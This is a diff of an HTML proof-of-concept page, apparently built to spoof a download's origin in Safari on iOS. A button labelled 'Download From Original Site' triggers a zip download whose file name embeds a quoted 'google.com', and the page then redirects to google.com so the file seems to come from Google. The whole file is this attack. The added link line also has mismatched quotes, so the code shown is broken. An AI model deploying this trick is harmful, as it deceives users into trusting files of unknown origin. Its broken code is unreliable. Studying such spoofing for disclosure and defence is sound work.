@@ -1,44 +1,49 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-    }
-  </style> 
+<meta charset="utf-8">
+<title>Safari iOS Download + Redirect PoC</title>
+
+<style>
+.button {
+  background:#4CAF50;
+  color:#fff;
+  padding:14px 28px;
+  font-size:16px;
+  border:0;
+  cursor:pointer;
+}
+</style>
 </head>
+
 <body>
 
 <script>
-function a() {
+function poc() {
+  const a = document.createElement("a");
 
-  // Trigger download terlebih dahulu
-  var link = document.createElement('a');
-  link.href = 'https://ecdnts-del.github.io/test-apk/on "google.com" file.zip also.zip';
-  link.download = 'on "google.com" file.zip';
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
+  // URL filename (normal)
+  a.href = "https://ecdnts-del.github.io/test-apk/on "google.com" file.zip';
 
-  // Redirect setelah download mulai (delay kecil)
-  setTimeout(function () {
-    window.location.href = "https://google.com";
-  }, 3000); // 0.8 detik
+  // download filename (rusak parsing Safari)
+  a.download = 'on "google.com" file.zip';
+
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // Redirect SETELAH download dipicu
+  setTimeout(() => {
+    window.location.replace("https://google.com");
+  }, 2500); // 2–3 detik paling aman di iOS
 }
 </script>
 
 <center>
-  <input type="button" class="button" value="Download From Original Site" onclick="a()">
+  <button class="button" onclick="poc()">
+    Download From Original Site
+  </button>
 </center>
 
 </body>
 </html>
- 
